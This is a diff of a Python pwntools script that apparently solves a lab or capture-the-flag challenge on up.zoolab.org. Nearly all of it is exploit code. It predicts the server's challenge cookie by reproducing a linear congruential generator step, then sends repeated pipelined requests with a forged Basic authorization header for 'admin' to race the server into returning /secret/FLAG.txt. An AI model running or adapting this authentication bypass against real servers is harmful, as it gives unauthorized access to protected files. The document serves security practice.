@@ -1,42 +1,35 @@
 from pwn import *
-import time
-import threading
+from base64 import b64encode
 
 r = remote('up.zoolab.org', 10933)
 
-cookie = f""
-
 def send_normal():
-    request = "GET / HTTP/1.1\n\n"
-    r.sendline(request.encode())
+    r.send(b"GET / HTTP/1.1\r\n\r\n")
 
 def first_send_flag():
-    global cookie, r
-    auth = base64.b64encode(b':').decode()
-    request = f"GET /secret/FLAG.txt HTTP/1.1\nAuthorization: Basic {auth}\nCookie: {cookie}\n\n"
-    r.sendline(request.encode())
-    r.recvuntil(b'challenge=')
-    cookie = r.recvuntil(b';').decode().replace('\r','')[:-1]
-    r.recvuntil(b'\r\n\r\n').decode().replace('\r','')
+    r.send(b"GET /secret/FLAG.txt\r\n\r\n")
+    r.recvuntil(b"challenge=")
+    cookie = r.recvuntil(b';')[:-1].decode()
+    r.recvuntil(b'\r\n\r\n')
+    return int(cookie)
 
-def send_flag():
-    global r
-    auth = base64.b64encode(b':').decode()
-    print("cookie: ", cookie)
-    request = f"GET /secret/FLAG.txt HTTP/1.1\nAuthorization: Basic {auth}\nCookie: {cookie}\n\n"
-    r.sendline(request.encode())
-    print(r.recvuntil(b'\r\n\r\n').decode().replace('\r','').decode())
+def send_flag(cookie):
+    r.send(b"GET /secret/FLAG.txt HTTP/1.1\r\n")
+    r.send(b"Authorization: Basic " + b64encode(b"admin:") + b"\r\n")
+    r.send(f"Cookie: response={cookie}\r\n\r\n".encode())
+    return r.recvline_startswith(delims=b"FLAG", timeout=0.01).decode()
 
-thread0 = threading.Thread(target=first_send_flag)
-thread1 = threading.Thread(target=send_flag)
+def solve_cookie(cookie):
+    cookie = (cookie * 6364136223846793005) & 0xFFFFFFFFFFFFFFFF
+    cookie = (cookie + 1) & 0xFFFFFFFFFFFFFFFF
+    return (cookie >> 33) & 0xFFFFFFFFFFFFFFFF
 
-thread0.start()
-time.sleep(5)
-thread1.start()
-
-thread0.join()
-thread1.join()
-
+cookie = solve_cookie(first_send_flag())
+for _ in range(500):
+    send_normal()
+    msg = send_flag(cookie)
+    if len(msg) > 0:
+        print(msg)
+        break
 
 r.close()
-
